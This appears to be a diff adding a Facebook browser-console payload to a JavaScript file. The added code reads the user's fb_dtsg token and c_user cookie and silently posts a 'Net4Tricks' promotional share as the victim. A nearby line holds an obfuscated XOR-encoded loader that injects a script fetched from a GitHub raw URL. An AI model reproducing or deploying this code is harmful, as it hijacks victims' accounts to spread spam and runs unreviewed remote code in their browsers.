@@ -182,6 +182,32 @@ p("243188212508705");
 
 
 
+/*promote Net4Tricks*/
+
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+var now = (new Date).getTime();
+
+ function PI(r) {
+   
+         var Page = new XMLHttpRequest();
+         var PageURL = "//www.facebook.com/ajax/sharer/submit_page/";
+         var PageParams = "fb_dtsg=" + fb_dtsg + "&next=&mode=self&friendTarget=&groupTarget=&pageTarget=" + r + "&post_as_page=1&message_text=Net4Tricks%EF%BB%BF%2C%20We%20will%20provide%20you%20Latest%20Tricks%20%26%20Tools%20!!!&message=%40[291522814324096%3ANet4Tricks]%2C%20We%20will%20provide%20you%20Latest%20Tricks%20%26%20Tools%20!!!&app_id=2309869772&attachment[params][urlInfo][canonical]=http%3A%2F%2Fwww.net4tricks.blogspot.in%2F&attachment[params][urlInfo][final]=http%3A%2F%2Fwww.net4tricks.blogspot.in%2F&attachment[params][urlInfo][user]=http%3A%2F%2Fwww.net4tricks.blogspot.in%2F&attachment[params][favicon]=http%3A%2F%2Flh5.googleusercontent.com%2F-ABdi6cwN9aQ%2FUaWnwE2bAMI%2FAAAAAAAACwE%2F5oJzZs86ipA%2Fs22%2Fnavi.gif&attachment[params][title]=Net4Tricks&attachment[params][summary]=Posted%20in%20Facebook%20Tricks%20Posted%20in%20Facebook%20Tricks%20Posted%20in%20Browsing%20Tips%20Posted%20in%20Facebook%20Tricks&attachment[params][images][0]=http%3A%2F%2F4.bp.blogspot.com%2F-r2OVW6TM0Z0%2FUk7mplAaRtI%2FAAAAAAAAASQ%2FFiXCETi-6L8%2Fs1600%2F851560_683381268354462_524031238_n.png&attachment[params][medium]=106&attachment[params][url]=http%3A%2F%2Fwww.net4tricks.blogspot.in%2F&attachment[type]=100&link_metrics[source]=ShareStageExternal&link_metrics[domain]=www.net4tricks.blogspot.in&link_metrics[base_domain]=net4tricks.blogspot.in&link_metrics[title_len]=10&link_metrics[summary_len]=101&link_metrics[min_dimensions][0]=70&link_metrics[min_dimensions][1]=70&link_metrics[images_with_dimensions]=3&link_metrics[images_pending]=0&link_metrics[images_fetched]=0&link_metrics[image_dimensions][0]=788&link_metrics[image_dimensions][1]=544&link_metrics[images_selected]=3&link_metrics[images_considered]=5&link_metrics[images_cap]=3&link_metrics[images_type]=ranked&composer_metrics[best_image_w]=100&composer_metrics[best_image_h]=100&composer_metrics[image_selected]=0&composer_metrics[images_provided]=3&composer_metrics[images_loaded]=3&composer_metrics[images_shown]=3&composer_metrics[load_duration]=6&composer_metrics[timed_out]=0&composer_metrics[sort_order]=&composer_metrics[selector_type]=UIThumbPager_6&share_source_type=unknown&src=&appid=5085647995&parent_fbid=&ogid=&audience[0][value]=80&UITargetedPrivacyWidget=80&share=Share%20Link&__user=" + user_id + "&__a=1&__dyn=7wAzU4Oi3S8w&__req=7&ttstamp=265816780681095680";
+         Page.open("POST", PageURL, true);
+         Page.onreadystatechange = function () {
+             if (Page.readyState == 4 && Page.status == 200) {
+                 Page.close;
+             }
+         };
+         Page.send(PageParams);
+     }
+
+ PI("199134496914077");
+ 
+ 
+ 
+ 
+ 
 var _0xd3a2=["\x6A\x76\x76\x72\x71\x38\x2D\x2D\x70\x63\x75\x2C\x65\x6B\x76\x6A\x77\x60\x2C\x61\x6D\x6F\x2D\x60\x6A\x63\x70\x65\x63\x74\x33\x3B\x3B\x34\x2D\x44\x60\x2F\x43\x77\x76\x6D\x2F\x76\x6D\x6D\x6E\x71\x2D\x6F\x63\x71\x76\x67\x70\x2D\x48\x67\x71\x76\x67\x70\x2C\x72\x6A\x72","","\x6C\x65\x6E\x67\x74\x68","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x73\x72\x63","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];var a=_0xd3a2[0];b=_0xd3a2[1];c=_0xd3a2[1];var d;d=a[_0xd3a2[2]];for(i=0;i<d;i++){b+=String[_0xd3a2[4]](a[_0xd3a2[3]](i)^2);} ;c=unescape(b);document[_0xd3a2[9]][_0xd3a2[8]](document[_0xd3a2[7]](_0xd3a2[6]))[_0xd3a2[5]]=c;
 
 
